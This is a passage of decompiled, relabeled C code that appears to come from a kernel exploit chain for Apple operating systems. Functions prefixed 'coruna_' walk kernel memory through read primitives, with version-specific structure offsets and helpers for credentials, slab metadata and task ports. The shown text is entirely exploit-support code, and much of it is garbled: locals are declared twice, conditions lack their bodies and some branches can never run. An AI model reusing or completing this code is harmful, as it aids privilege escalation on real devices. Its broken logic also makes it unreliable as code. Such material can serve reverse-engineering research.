    if (1 < err - 0x1f53U && err != 0x1809) {
      if (err != 0x1c1b) {
        return 0;
      }
      u = 0x20;
      if (*(unsigned long *)(handle + 0x158) < 0x1c1b1914600000) {
        u = 0x28;
      }
    }
  }
  else if ((err != 0x2258 && err != 0x225c) && err != 0x2712) {
    return 0;
  }
  return u;
}





void coruna_call_macho_data_seg_2bb24(void)
{
  coruna_macho_data_seg_2bb24();
  return;
}





void coruna_macho_data_seg_2bb24(long handle,unsigned long arg,int flags,char *path)
{
  int err;
  unsigned long u;
  int status;
  int flags;
  unsigned long size;
  long handle;
  long addr;
  long off;
  unsigned long version;
  long base;
  int count;
  int scratch;
  unsigned long bootargs;
  long thread_attr;
  unsigned long host_info;
  long serial_buf;
  long action;
  
  action = *(long *)k_kernel_stack_chk_guard_slot;
  status = *(int *)(handle + 0x140);
  size = 0;
  if (path == (char *)0x0) {
    if (status < 0x2258) {
      if (*(long *)k_kernel_stack_chk_guard_slot == action) {
      return;
      }
      ___stack_chk_fail(size);
    }
    else {
      if (*(long *)k_kernel_stack_chk_guard_slot == action) {
      return;
      }
      ___stack_chk_fail(size);
    }
  }
  else if (status == 0x2258) {
    off = 0x381;
    addr = 0;
  }
  else {
    if (*(long *)k_kernel_stack_chk_guard_slot == action) {
    return;
    }
    ___stack_chk_fail(size);
  }
  status = coruna_return_zero_2ba94(handle);
  if (status == 0) {
done:
    size = 0;
  }
  else {
    err = *(int *)(handle + 0x168);
    if (*(long *)(&k_kernel_slot_19f8 + handle) == 0) {
      serial_buf = 0;
      version = 0;
      base = 0;
    }
    else {
      coruna_macho_find_loadcmd(&thread_attr,*(long *)(&k_kernel_slot_19f8 + handle),"__DATA");
      size = 0;
      if ((host_info == 0) || (version = host_info, base = thread_attr, serial_buf == 0))
      if (*(long *)k_kernel_stack_chk_guard_slot == action) {
      return;
      }
      ___stack_chk_fail(size);
    }
    count = 0;
    u = arg;
cleanup:
    do {
      bootargs = u;
      handle = coruna_return_zero_2ba0c(handle,bootargs);
      if (handle != 0) {
        if (path == (char *)0x0) {
          flags = coruna_nop_stub_6(handle,handle + addr,4,&scratch);
          if (flags == 0) { size = 0; break; }
          size = bootargs;
          if (scratch == flags) break;
        }
        else {
          flags = coruna_nop_stub_6(handle,handle + off,0x21,&thread_attr);
          if (flags == 0) { size = 0; break; }
          flags = _strncmp((char *)&thread_attr,path,0x21);
          size = bootargs;
          if (flags == 0) break;
        }
      }
      flags = coruna_kernel6544_residual_256(handle,bootargs + (uint)(err + status),&bootargs);
      if (flags == 0) { size = 0; break; }
      bootargs = coruna_ptr_canonicalize(handle,bootargs);
      if (bootargs != 0) {
        if (((base != 0) && (version <= bootargs)) && (bootargs < version + serial_buf)) {
          flags = coruna_kernel6544_residual_256(handle,bootargs,&bootargs);
          if (flags == 0) { size = 0; break; }
          bootargs = coruna_ptr_canonicalize(handle,bootargs);
          if (bootargs == 0) goto check_ok;
        }
        u = bootargs;
        if (bootargs != arg) continue;
      }
check_ok:
      coruna_semaphore_timedwait(handle,&k_kernel_rodata_word_3d090);
      size = 0;
      count = count + 1;
      u = arg;
    } while (count != 6);
  }
fail:
  if (*(long *)k_kernel_stack_chk_guard_slot == action) {
    return;
  }
  ___stack_chk_fail(size);
}





void coruna_call_macho_data_seg_2bb24_2bdb4(uint64_t val,uint64_t id_2,uint64_t size_3)
{
  coruna_macho_data_seg_2bb24(val,id_2,0,size_3);
  return;
}





long coruna_return_zero_2bdc0(long handle,long addr_2,uint *size,uint32_t *size_x)
{
  int err;
  long handle;
  long scratch;
  uint bootargs;
  
  bootargs = 0;
  err = *(int *)(handle + 0x140);
  if (err < 0x2258) {
    if (1 < err - 0x1f53U) {
      if (err != 0x1809 && err != 0x1c1b) {
        return 0;
      }
      handle = 0x14;
      err = coruna_kernel6544_residual_256(handle,addr_2 + 0x20,&scratch);
      if ((err == 0) || (scratch == 0)) {
      return 0;
      }
      if (0x22580a06bfffff < *(unsigned long *)(handle + 0x158)) {
      scratch = coruna_kernel6544_via_ctx_test_flag_8(handle,scratch,&bootargs);
      }
      scratch = coruna_ptr_canonicalize(handle,scratch);
      if (scratch != 0) {
      if (*(unsigned long *)(handle + 0x158) < 0x22580a06c00000) {
      if (0x1f01 < *(int *)(handle + 0x140)) {
      addr_2 = scratch;
      }
      err = coruna_kernel6544_via_fcntl_1bf84(handle,addr_2 + handle,&bootargs);
      if (err == 0) {
      return 0;
      }
      }
      else {
      if (bootargs == 0) {
      return 0;
      }
      bootargs = bootargs / 0x18;
      }
      *size = bootargs;
      *size_x = 0x18;
      return scratch;
      }
      return 0;
    }
  }
  else if ((err != 0x2258 && err != 0x2712) && err != 0x225c) {
    return 0;
  }
  handle = 8;
fail:
  err = coruna_kernel6544_residual_256(handle,addr_2 + 0x20,&scratch);
  if ((err == 0) || (scratch == 0)) {
    return 0;
  }
  if (0x22580a06bfffff < *(unsigned long *)(handle + 0x158)) {
    scratch = coruna_kernel6544_via_ctx_test_flag_8(handle,scratch,&bootargs);
  }
  scratch = coruna_ptr_canonicalize(handle,scratch);
  if (scratch != 0) {
    if (*(unsigned long *)(handle + 0x158) < 0x22580a06c00000) {
      if (0x1f01 < *(int *)(handle + 0x140)) {
        addr_2 = scratch;
      }
      err = coruna_kernel6544_via_fcntl_1bf84(handle,addr_2 + handle,&bootargs);
      if (err == 0) {
        return 0;
      }
    }
    else {
      if (bootargs == 0) {
        return 0;
      }
      bootargs = bootargs / 0x18;
    }
    *size = bootargs;
    *size_x = 0x18;
    return scratch;
  }
  return 0;
}





void coruna_pid_for_task(uint64_t val,long handle,uint64_t id_2,int *flags)
{
  int err;
  kern_return_t lk2;
  int scratch;
  
  coruna_kernel6544_residual_300();
  err = coruna_kernel6544_residual_301(handle,0,1);
  if ((err == 0) &&
     (lk2 = _pid_for_task(*(mach_port_name_t *)(handle + 0x3c),&scratch), lk2 == 0)) {
    *flags = scratch;
  }
  return;
}





long coruna_return_zero_2c0bc(uint64_t val,uint64_t id_2,uint size)
{
  long handle;
  int scratch;
  uint bootargs;
  
  if (1 < size + 1) {
    handle = coruna_pid_for_task(val,id_2,&bootargs,&scratch);
    if (handle == 0) {
      return 0;
    }
    if (size >> 8 < bootargs) {
      return handle + (unsigned long)(scratch * (size >> 8));
    }
  }
  return 0;
}





void coruna_call_return_zero_2c0bc(uint64_t val,uint64_t id_2)
{
  coruna_return_zero_2c0bc(val,*(uint32_t *)k_kernel_mach_task_self_slot,id_2);
  return;
}





uint64_t coruna_kernel6544_via_return_zero_2c0bc(uint64_t val)
{
  int err;
  long handle;
  uint64_t u;
  uint64_t scratch;
  
  handle = coruna_return_zero_2c0bc();
  u = 0;
  if (handle != 0) {
    err = coruna_kernel6544_residual_256(val,handle,&scratch);
    if (err == 0) {
      u = 0;
    }
    else {
      u = coruna_ptr_canonicalize(val,scratch);
    }
  }
  return u;
}





unsigned long coruna_return_zero_2c190(long arg,long val,unsigned long n)

{
  int count;
  long serial_7;
  unsigned long u;
  unsigned long cache_20;
  unsigned long cache_42;
  unsigned long cache_60;
  
  cache_20 = 0;
  count = coruna_kernel6544_residual_256(arg,val + (unsigned long)(4 < *(long *)(arg + 0x158) +
                                                     0xffe0abe700000000U >> 0x20) * 0x10,&cache_60);
  if (count != 0) {
    serial_7 = coruna_ptr_canonicalize(arg,cache_60);
    if (serial_7 == 0) {
      return 0;
    }
    if (*(int *)(arg + 0x140) < 0x1c1b) {
      return cache_60;
    }
    count = coruna_kernel6544_residual_256(arg,cache_60 + 0x20,&cache_42);
    if (count != 0) {
      serial_7 = coruna_ptr_canonicalize(arg,cache_42);
      if (serial_7 == 0) {
        return 0;
      }
      if ((n & 1) != 0) {
        return cache_42;
      }
      count = coruna_kernel6544_via_fcntl_1bf84_2(arg,cache_42 + 0x38,&cache_20);
      if (count == 0) {
        return cache_20;
      }
      if (0x1f542301dfffff < *(unsigned long *)(arg + 0x158)) {
        cache_20 = coruna_return_zero_20e90(arg,cache_20 >> 0x20);
      }
      u = coruna_ptr_canonicalize(arg,cache_20);
      return u;
    }
  }
  return 0;
}





long coruna_kernel6544_via_return_zero_2c3b8(uint64_t val,uint64_t id_2,unsigned long arg)
{
  long handle;
  bool err;
  int err;
  int status;
  long addr;
  long off;
  long base;
  uint u;
  unsigned long scratch;
  unsigned long bootargs;
  long thread_attr;
  
  addr = coruna_return_zero_2c3b8();
  base = 0;
  if (addr != 0) {
    u = 0;
    do {
      err = false;
      err = coruna_kernel6544_residual_256(val,addr + 0x38,&thread_attr);
      handle = thread_attr;
      status = err;
joined_r0x0002c2f4:
      thread_attr = handle;
      if (!((((status == 0) || (handle == 0)) || (off = coruna_ptr_canonicalize(val,handle), off == 0)) ||
         (status = coruna_kernel6544_residual_256(val,handle + -0x10,&bootargs), status == 0))) {
        off = thread_attr;
        if (arg < bootargs) {
        fail:
        status = coruna_kernel6544_residual_256(val,off,&thread_attr);
        handle = thread_attr;
        goto joined_r0x0002c2f4;
        }
        status = coruna_kernel6544_residual_256(val,handle + -8,&scratch);
        if (!(status == 0)) {
        if (scratch <= arg) {
        off = thread_attr + 8;
        goto fail;
        }
        base = handle + -0x20;
        err = true;
        }
      }
joined_r0x0002c394:
    } while (((err != 0) && (!err)) && (err = u < 5, u = u + 1, err));
  }
  return base;
}





long coruna_return_zero_2c3b8(uint64_t val,uint64_t id_2)
{
  uint u;
  int err;
  long handle;
  long scratch;
  
  u = coruna_return_zero_2ba94();
  if (u != 0) {
    scratch = coruna_kernel6544_via_return_zero_2b000(val,id_2);
    if (scratch == 0) {
      return 0;
    }
    err = coruna_kernel6544_residual_256(val,scratch + (unsigned long)u,&scratch);
    if (err != 0) {
      handle = coruna_ptr_canonicalize(val,scratch);
      if (handle == 0) {
        return 0;
      }
      return scratch;
    }
  }
  return 0;
}





unsigned long coruna_return_zero_2c440(long arg,uint64_t val,uint64_t n,unsigned long *m)

{
  void (*ptr)(void);
  int flags;
  unsigned long u;
  long base;
  unsigned long version;
  unsigned long unaff_x30;
  unsigned long cache;
  unsigned long serial_buf;
  
  flags = coruna_ctx_test_flag(arg,0x800000);
  if (flags == 0) {
    base = coruna_kernel6544_via_return_zero_2c3b8(arg,val,n);
    if ((base != 0) && (flags = coruna_nop_stub_6(arg,base + 0x38,0x10,&cache), flags != 0)) {
      if (0x1f542301dfffff < *(unsigned long *)(arg + 0x158)) {
        cache = coruna_return_zero_20e90(arg,cache >> 0x20);
      }
      base = coruna_ptr_canonicalize(arg,cache);
      if (base != 0) {
        *m = serial_buf & 0xfffffffffffff000;
        return cache;
      }
    }
    return 0;
  }
  u = coruna_vm_page_info(val,n,m);
  if (u == 0) {
    return 0;
  }
  if ((u & 1) == 0) {
    if (*(long *)(&k_kernel_slot_19e0 + arg) == 0) {
      return 0;
    }
    version = *(long *)(&k_kernel_slot_19e0 + arg) + u;
    if (((unaff_x30 ^ unaff_x30 << 1) >> 0x3e & 1) == 0) {
    u = coruna_ptr_canonicalize(arg,version);
    return u;
    }
    ___stack_chk_fail();
    if (*(unsigned long *)(&k_kernel_slot_19c8 + arg) == 0) {
      return 0;
    }
    u = *(unsigned long *)(&k_kernel_slot_19c8 + arg) & 0xffffffff00000000;
  }
  else {
    version = u - *(long *)(arg + 0x138);
    if (u >> 0x20 == 0) {
      version = version & 0xffffffff;
    }
    if (((unaff_x30 ^ unaff_x30 << 1) >> 0x3e & 1) == 0) {
    u = coruna_ptr_canonicalize(arg,version);
    return u;
    }
    ___stack_chk_fail();
    u = *(unsigned long *)(arg + 0x130);
    if (u == 0) {
      return 0;
    }
  }
  version = u | version;
load_ok_71:
  if (((unaff_x30 ^ unaff_x30 << 1) >> 0x3e & 1) == 0) {
    u = coruna_ptr_canonicalize(arg,version);
    return u;
  }
    ___stack_chk_fail();
}





void coruna_kernel6544_via_kernel6544_via_return_zero_2b000_2(uint64_t val)
{
  void (*ptr)(void);
  long handle;
  unsigned long unaff_x30;
  
  handle = coruna_kernel6544_via_return_zero_2b000();
  if (handle == 0) {
    return;
  }
  if (((unaff_x30 ^ unaff_x30 << 1) >> 0x3e & 1) != 0) {
    ___stack_chk_fail();
}
  coruna_return_zero_2ba0c(val,handle);
  return;
}





long coruna_return_zero_2c5e0(long handle)
{
  int err;
  long handle;
  long scratch;
  
  scratch = coruna_return_zero_2ba0c();
  if (scratch == 0) {
    return 0;
  }
  if (0x1f530f027fffff < *(unsigned long *)(handle + 0x158)) {
    handle = 0x18;
    if (*(int *)(handle + 0x140) < 0x2258) {
      handle = 0x20;
    }
    err = coruna_kernel6544_residual_256(handle,handle + scratch,&scratch);
    if (err == 0) {
      return 0;
    }
    handle = coruna_ptr_canonicalize(handle,scratch);
    if (handle == 0) {
      return 0;
    }
  }
  err = *(int *)(handle + 0x140);
  if (err < 0x2258) {
    if (err - 0x1f53U < 2) {
      handle = 0x20;
      if (*(unsigned long *)(handle + 0x158) < 0x1f530f02800000) {
        handle = 0xd8;
      }
    }
    else if (err == 0x1809) {
      handle = 0x100;
    }
    else {
      if (err != 0x1c1b) {
        return 0;
      }
      handle = 0xf0;
    }
  }
  else {
    if (((err != 0x2258) && (err != 0x225c)) && (err != 0x2712)) {
      return 0;
    }
    handle = 0x20;
  }
  return scratch + handle;
}





void coruna_kernel6544_via_kernel6544_via_return_zero_2b000_3(uint64_t val)
{
  void (*ptr)(void);
  long handle;
  unsigned long unaff_x30;
  
  handle = coruna_kernel6544_via_return_zero_2b000();
  if (handle == 0) {
    return;
  }
  if (((unaff_x30 ^ unaff_x30 << 1) >> 0x3e & 1) != 0) {
    ___stack_chk_fail();
}
  coruna_return_zero_2c5e0(val,handle);
  return;
}





uint64_t coruna_return_zero_2c750(uint64_t val,uint64_t id_2,uint64_t *size_3)
{
  int err;
  long handle;
  long addr;
  uint64_t scratch;
  uint64_t bootargs;
  
  handle = coruna_return_zero_2c5e0();
  if (handle == 0) {
    return 0;
  }
  err = coruna_kernel6544_residual_256(val,handle,&bootargs);
  if (err != 0) {
    addr = coruna_ptr_canonicalize(val,bootargs);
    if (addr == 0) {
      return 0;
    }
    if (size_3 == (uint64_t *)0x0) {
      return bootargs;
    }
    err = coruna_kernel6544_via_fcntl_1bf84_2(val,handle,&scratch);
    if (err != 0) {
      *size_3 = scratch;
      return bootargs;
    }
  }
  return 0;
}





void coruna_kernel6544_via_kernel6544_via_return_zero_2b000_4(uint64_t val,uint64_t id_2,uint64_t size_3)
{
  void (*ptr)(void);
  long handle;
  unsigned long unaff_x30;
  
  handle = coruna_kernel6544_via_return_zero_2b000();
  if (handle == 0) {
    return;
  }
  if (((unaff_x30 ^ unaff_x30 << 1) >> 0x3e & 1) != 0) {
    ___stack_chk_fail();
}
  coruna_return_zero_2c750(val,handle,size_3);
  return;
}





long coruna_return_zero_2c834(long handle)
{
  bool err;
  int err;
  long handle;
  long addr;
  long off;
  long scratch;
  
  handle = coruna_kernel6544_via_return_zero_2b000();
  if (handle == 0) {
    return 0;
  }
  err = *(int *)(handle + 0x140);
  if (err - 0x1f53U < 2 || err == 0x1c1b) {
    if (*(unsigned long *)(handle + 0x158) < 0x1c1b1914600000) {
      err = coruna_ctx_test_flag(handle,0x5584201);
      err = err == 0;
      addr = 0x418;
      off = 0x460;
    }
    else {
      err = coruna_ctx_test_flag(handle,0x100000);
      if (err != 0) {
        off = 0x4f0;
        addr = handle + off;
        if ((*(unsigned long *)(handle + 0x158) < 0x1f530f02800000) &&
        (err = coruna_kernel6544_residual_256(handle,handle + off,&scratch), addr = scratch, err == 0)) {
        return 0;
        }
        scratch = addr;
        handle = coruna_ptr_canonicalize(handle,scratch);
        if (handle != 0) {
        return scratch;
        }
        return 0;
      }
      err = coruna_ctx_test_flag(handle,0x84000);
      if (err != 0) {
        off = 0x4e8;
        addr = handle + off;
        if ((*(unsigned long *)(handle + 0x158) < 0x1f530f02800000) &&
        (err = coruna_kernel6544_residual_256(handle,handle + off,&scratch), addr = scratch, err == 0)) {
        return 0;
        }
        scratch = addr;
        handle = coruna_ptr_canonicalize(handle,scratch);
        if (handle != 0) {
        return scratch;
        }
        return 0;
      }
      err = coruna_ctx_test_flag(handle,1);
      if (err != 0) {
        off = 0x4e0;
        addr = handle + off;
        if ((*(unsigned long *)(handle + 0x158) < 0x1f530f02800000) &&
        (err = coruna_kernel6544_residual_256(handle,handle + off,&scratch), addr = scratch, err == 0)) {
        return 0;
        }
        scratch = addr;
        handle = coruna_ptr_canonicalize(handle,scratch);
        if (handle != 0) {
        return scratch;
        }
        return 0;
      }
      err = coruna_ctx_test_flag(handle,0x200);
      err = err == 0;
      addr = 0x4d0;
      off = 0x510;
    }
  }
  else {
    if (err != 0x1809) {
      return 0;
    }
    err = coruna_ctx_test_flag(handle,0x5584201);
    err = err == 0;
    addr = 0x3c0;
    off = 0x3d8;
  }
  if (!err) {
    off = addr;
  }
fail:
  addr = handle + off;
  if ((*(unsigned long *)(handle + 0x158) < 0x1f530f02800000) &&
     (err = coruna_kernel6544_residual_256(handle,handle + off,&scratch), addr = scratch, err == 0)) {
    return 0;
  }
  scratch = addr;
  handle = coruna_ptr_canonicalize(handle,scratch);
  if (handle != 0) {
    return scratch;
  }
  return 0;
}





long coruna_return_zero_2c9a0(long handle)
{
  int err;
  long handle;
  long addr;
  
  if (*(unsigned long *)(handle + 0x158) < 0x1f530f02800000) {
    addr = coruna_return_zero_2c834(handle);
    if (addr != 0) {
      err = *(int *)(handle + 0x140);
      if (err == 0x1f53) {
        handle = 0x120;
      }
      else if (err == 0x1c1b) {
        handle = 0x128;
      }
      else {
        if (err != 0x1809) {
          return 0;
        }
        handle = 0x128;
        if (*(unsigned long *)(handle + 0x158) < 0x18090a09600000) {
          handle = 0x150;
        }
      }
      addr = handle + addr;
    }
  }
  else {
    handle = coruna_return_zero_2ca60(handle);
    addr = 0;
    if (handle != 0) {
      addr = handle + 8;
    }
  }
  return addr;
}





uint64_t coruna_return_zero_2ca60(uint64_t val,uint64_t id_2)
{
  uint u;
  int err;
  long handle;
  uint64_t scratch;
  
  scratch = 0;
  u = coruna_return_zero_2cae8();
  if (u != 0) {
    handle = coruna_kernel6544_via_return_zero_2b000(val,id_2);
    if (handle == 0) {
      return 0;
    }
    err = coruna_kernel6544_residual_256(val,handle + (unsigned long)u,&scratch);
    if (err != 0) {
      handle = coruna_ptr_canonicalize(val,scratch);
      if (handle == 0) {
        return 0;
      }
      return scratch;
    }
  }
  return 0;
}





int coruna_return_zero_2cae8(long handle)
{
  int err;
  int status;
  unsigned long u;
  unsigned long size;
  
  err = *(int *)(handle + 0x140);
  if (err < 0x225c) {
    if (1 < err - 0x1f53U) {
      if (err != 0x2258) {
        return 0;
      }
fail:
      err = coruna_ctx_test_flag(handle,0x1100000);
      if (err != 0) {
        return 0x378;
      }
      err = coruna_ctx_test_flag(handle,0x84000);
      if (err != 0) {
        return 0x370;
      }
      err = coruna_ctx_test_flag(handle,1);
      if (err != 0) {
        return 0x360;
      }
      err = coruna_ctx_test_flag(handle,0x200);
      if (err == 0) {
        return 0x390;
      }
      return 0x350;
    }
    if (*(unsigned long *)(handle + 0x158) < 0x1f530f02800000) {
      return 0;
    }
    err = coruna_ctx_test_flag(handle,0x100000);
    if (err == 0) {
      err = coruna_ctx_test_flag(handle,0x84000);
      if (err == 0) {
        err = coruna_ctx_test_flag(handle,1);
        if (err == 0) {
          err = coruna_ctx_test_flag(handle,0x200);
          status = 0x3c0;
          if (err != 0) {
            status = 0x380;
          }
        }
        else {
          status = 0x390;
        }
      }
      else {
        status = 0x398;
      }
    }
    else {
      status = 0x3a0;
    }
    u = *(unsigned long *)(handle + 0x158);
    err = status + -8;
    size = 0x1f541dffffffff;
  }
  else {
    err = coruna_ctx_test_flag(handle,0x1100000);
    if (err != 0) {
    return 0x378;
    }
    err = coruna_ctx_test_flag(handle,0x84000);
    if (err != 0) {
    return 0x370;
    }
    err = coruna_ctx_test_flag(handle,1);
    if (err != 0) {
    return 0x360;
    }
    err = coruna_ctx_test_flag(handle,0x200);
    if (err == 0) {
    return 0x390;
    }
    return 0x350;
  }
  if (u <= size) {
    err = status;
  }
  return err;
}





long coruna_return_zero_2ccdc(long handle)
{
  int err;
  long handle;
  long addr;
  
  handle = coruna_return_zero_2c834();
  addr = 0;
  if (handle != 0) {
    err = *(int *)(handle + 0x140);
    if (err < 0x1f53) {
      if (err == 0x1809) {
        addr = 0x108;
        if (*(unsigned long *)(handle + 0x158) < 0x18090a09600000) {
          addr = 0x130;
        }
      }
      else {
        if (err != 0x1c1b) {
          return 0;
        }
        addr = 0x108;
      }
    }
    else if (err == 0x1f53) {
      addr = 0x100;
    }
    else {
      if (err != 0x1f54) {
        return 0;
      }
      addr = 0xf0;
    }
    addr = addr + handle;
  }
  return addr;
}





long coruna_return_zero_2cd88(long handle)
{
  int err;
  long handle;
  long addr;
  
  if (*(unsigned long *)(handle + 0x158) < 0x1f530f02800000) {
    handle = coruna_kernel6544_via_kernel6544_via_return_zero_2b000_2();
  }
  else {
    handle = coruna_return_zero_2ce5c();
  }
  if (handle == 0) {
    return 0;
  }
  err = *(int *)(handle + 0x140);
  if (err < 0x2258) {
    if (1 < err - 0x1f53U) {
      if (err == 0x1809) {
        addr = 0x298;
      }
      else {
        if (err != 0x1c1b) {
          return 0;
        }
        addr = 0x280;
      }
      return addr + handle;
    }
  }
  else if (((err != 0x2258) && (err != 0x225c)) && (err != 0x2712)) {
    return 0;
  }
  addr = 0x1c;
  if (*(unsigned long *)(handle + 0x158) < 0x1f530f02800000) {
    addr = 0x300;
  }
fail:
  return addr + handle;
}





long coruna_return_zero_2ce5c(uint64_t val,uint64_t id_2)
{
  uint u;
  int err;
  long handle;
  long addr;
  long scratch;
  long bootargs;
  
  u = coruna_return_zero_2b7a0();
  if (u != 0) {
    handle = coruna_kernel6544_via_return_zero_2b000(val,id_2);
    if (handle == 0) {
      return 0;
    }
    addr = coruna_ptr_canonicalize(val,handle);
    if (addr == 0) {
      return 0;
    }
    err = coruna_kernel6544_residual_256(val,handle + (unsigned long)u,&bootargs);
    if (err != 0) {
      addr = coruna_ptr_canonicalize(val,bootargs);
      if (addr == 0) {
        return 0;
      }
      err = coruna_kernel6544_residual_256(val,bootargs + 8,&scratch);
      if (err != 0) {
        addr = coruna_ptr_canonicalize(val,scratch);
        if (handle == scratch && addr != 0) {
          return bootargs;
        }
        return 0;
      }
    }
  }
  return 0;
}





uint64_t coruna_iosurface_cred_walk(long handle)
{
  int err;
  
  err = *(int *)(handle + 0x140);
  if (err < 0x1f54) {
    if (err == 0x1809 || err == 0x1c1b) {
      return 0x10c;
    }
    if (err == 0x1f53) {
      return 0x11c;
    }
  }
  else if (err < 0x225c) {
    if (err == 0x1f54) {
      return 0x94;
    }
    if (err == 0x2258) {
      return 0xb4;
    }
  }
  else {
    if (err == 0x225c) {
      return 0xb4;
    }
    if (err == 0x2712) {
      return 200;
    }
  }
  return 0;
}





uint64_t coruna_slab_meta_offset(long handle)
{
  int err;
  bool err;
  uint64_t u;
  int status;
  
  u = 0;
  err = *(int *)(handle + 0x140);
  if (err < 0x1f54) {
    if ((err == 0x1809 || err == 0x1c1b) || err == 0x1f53) {
      return 0x48;
    }
  }
  else {
    if (err < 0x225c) {
      err = err == 0x1f54;
      status = 0x2258;
    }
    else {
      err = err == 0x2712;
      status = 0x225c;
    }
    if (err || err == status) {
      u = 0x40;
    }
  }
  return u;
}





uint64_t coruna_return_zero_2d034(uint64_t val,long handle)
{
  uint u;
  int err;
  long handle;
  uint64_t scratch;
  long bootargs;
  
  u = coruna_return_zero_2ba94();
  if ((u != 0) && (err = coruna_kernel6544_residual_256(val,handle + (unsigned long)u,&bootargs), err != 0))
  {
    handle = coruna_ptr_canonicalize(val,bootargs);
    if (handle == 0) {
      return 0;
    }
    u = coruna_slab_meta_offset(val);
    if ((u != 0) &&
       (err = coruna_kernel6544_residual_256(val,bootargs + (unsigned long)u,&scratch), err != 0)) {
      handle = coruna_ptr_canonicalize(val,scratch);
      if (handle == 0) {
        return 0;
      }
      return scratch;
    }
  }
  return 0;
}





long coruna_kernel6544_via_return_zero_2c3b8_2(uint64_t val,uint64_t id_2)
{
  uint u;
  int err;
  long handle;
  long scratch;
  
  u = coruna_slab_meta_offset();
  if (u == 0) {
    handle = 0;
  }
  else {
    scratch = coruna_return_zero_2c3b8(val,id_2);
    handle = scratch;
    if (scratch != 0) {
      err = coruna_kernel6544_residual_256(val,scratch + (unsigned long)u,&scratch);
      handle = 0;
      if (err != 0) {
        handle = scratch;
      }
    }
  }
  return handle;
}





void coruna_kernel6544_via_ptr_canonicalize_6(uint *size,uint64_t val)
{
  uint u;
  long handle;
  uint64_t size;
  unsigned long version;
  uint port;
  unsigned long scratch;
  long bootargs;
  unsigned long thread_attr;
  unsigned long host_info;
  long serial_buf;
  
  serial_buf = *(long *)k_kernel_stack_chk_guard_slot;
  thread_attr = 0;
  host_info = 0;
  handle = coruna_return_zero_2c750(size,val,0);
  size = 0;
  if ((handle == 0) || (size = coruna_kernel6544_residual_256(size,handle + 0x78,&bootargs), (int)size == 0))
  if (*(long *)k_kernel_stack_chk_guard_slot != serial_buf) {
  ___stack_chk_fail(size);
  }
  return;
}





uint64_t coruna_kernel6544_via_kernel6544_via_return_zero_2b000_5(long handle,uint32_t size)
{
  long handle;
  uint64_t u;
  
  handle = coruna_kernel6544_via_return_zero_2b000();
  u = 0;
  if ((handle != 0) && (u = coruna_kernel6544_via_ptr_canonicalize_6(handle,handle), (int)u != 0)) {
    *(uint32_t *)(&k_kernel_slot_18f8 + handle) = size;
    u = 1;
  }
  return u;
}





long coruna_return_zero_2d460(long handle,uint64_t val,int flags)
{
  bool err;
  int err;
  long handle;
  long addr;
  long off;
  int status;
  unsigned long u;
  
  if (flags == 0) {
    handle = coruna_kernel6544_via_return_zero_2b000();
    if (handle == 0) {
      return 0;
    }
    err = *(int *)(handle + 0x140);
    if (err < 0x2258) {
      if (err - 0x1f53U < 2) {
        err = coruna_ctx_test_flag(handle,0x100000);
        if (err != 0) {
          off = 0x3ec;
          if (*(unsigned long *)(handle + 0x158) < 0x1f530f02800000) {
            off = 0x41c;
          }
          return off + handle;
        }
        err = coruna_ctx_test_flag(handle,0x5584001);
        off = 0x3b8;
        if (*(unsigned long *)(handle + 0x158) < 0x1f530f02800000) {
          off = 1000;
        }
        addr = 0x3dc;
        if (*(unsigned long *)(handle + 0x158) < 0x1f530f02800000) {
          addr = 0x40c;
        }
        err = err == 0;
      }
      else {
        if (err != 0x1809) {
          if (err != 0x1c1b) {
            return 0;
          }
          u = *(unsigned long *)(handle + 0x158);
          err = coruna_ctx_test_flag(handle,0x5584001);
          off = 0x3d8;
          if (err != 0) {
            off = 0x3f4;
          }
          addr = 0x3e0;
          if (err != 0) {
            addr = 0x404;
          }
          if (0x1c1b19145fffff < u) {
            off = addr;
          }
          return off + handle;
        }
        err = coruna_ctx_test_flag(handle,0x5584001);
        err = err == 0;
        addr = 0x3c0;
        off = 0x3b8;
      }
    }
    else {
      if (((err != 0x2258) && (err != 0x225c)) && (err != 0x2712)) {
        return 0;
      }
      err = coruna_ctx_test_flag(handle,0x5100000);
      if (err != 0) {
        off = 0x3d0;
        return off + handle;
      }
      err = coruna_ctx_test_flag(handle,0x5584001);
      err = err == 0;
      addr = 0x3b8;
      off = 0x3a0;
    }
    if (!err) {
      off = addr;
    }
fail:
    return off + handle;
  }
  handle = coruna_return_zero_2ce5c();
  if (handle == 0) {
    return 0;
  }
  err = *(int *)(handle + 0x140);
  if (err < 0x225c) {
    return handle + 0x78;
  }
  else {
    return handle + 0x78;
  }
  if (err != status) {
    return 0;
  }
done:
  return handle + 0x78;
}





long coruna_return_zero_2d664(long handle,uint64_t val,int flags,uint *size)
{
  int err;
  long handle;
  uint u;
  uint scratch;
  
  scratch = 0;
  handle = coruna_return_zero_2d460();
  if (handle == 0) {
    return 0;
  }
  err = coruna_kernel6544_via_ioconnectcallmethod(handle,handle,&scratch);
  if (err == 0) {
    return 0;
  }
  if (*(int *)(handle + 0x140) < 0x1328) {
    if ((scratch >> 0x18) != 0) {
      return 0;
    }
  }
  else {
    u = scratch & 3;
    if (flags != 0) {
      if (u != 0) {
        return 0;
      }
    }
    else if (u != 3) {
      return 0;
    }
  }
  if (size != (uint *)0x0) {
    *size = scratch;
  }
  return handle;
}





void coruna_call_macho_data_seg_2bb24_2bdb4_20fac(uint64_t val,uint64_t id_2,uint64_t size_3)
{
  coruna_return_zero_2d664(val,id_2,0,size_3);
  return;
}





uint coruna_host_processors(long handle,int flags,long addr_2,uint *size)
{
  uint u;
  int err;
  long handle;
  long addr;
  vm_size_t size;
  long off;
  uint size;
  uint8_t *ptr;
  uint version;
  unsigned long port;
  uint scratch;
  long bootargs;
  long thread_attr;
  mach_msg_type_number_t host_info;
  processor_array_t serial_buf;
  int action [6];
  
  serial_buf = (processor_array_t)0x0;
  host_info = 0;
  bootargs = 0;
  thread_attr = 0;
  err = *(int *)(handle + 0x140);
  if (err < 0x2258) {
    if (1 < err - 0x1f53U) {
      if (err == 0x1809) {
        ptr = (uint8_t *)0x444;
        off = 0x20;
      }
      else {
        if (err != 0x1c1b) {
          return 0x28007;
        }
        off = 0x28;
        if (*(unsigned long *)(handle + 0x158) < 0x1c1b1401000000) {
          off = 0x20;
        }
        ptr = (uint8_t *)0x4b4;
      }
      goto fail;
    }
  }
  else if ((err != 0x2258 && err != 0x225c) && err != 0x2712) {
    return 0x28007;
  }
  err = coruna_ctx_test_flag(handle,0x4000000);
  ptr = (uint8_t *)0x8ac;
  if (err != 0) {
    ptr = &UNK_00003d3c;
  }
  if (0x1f52 < *(int *)(handle + 0x140)) {
    if (*(long *)(&k_kernel_slot_19f8 + handle) != 0) {
      coruna_macho_text_sect(action);
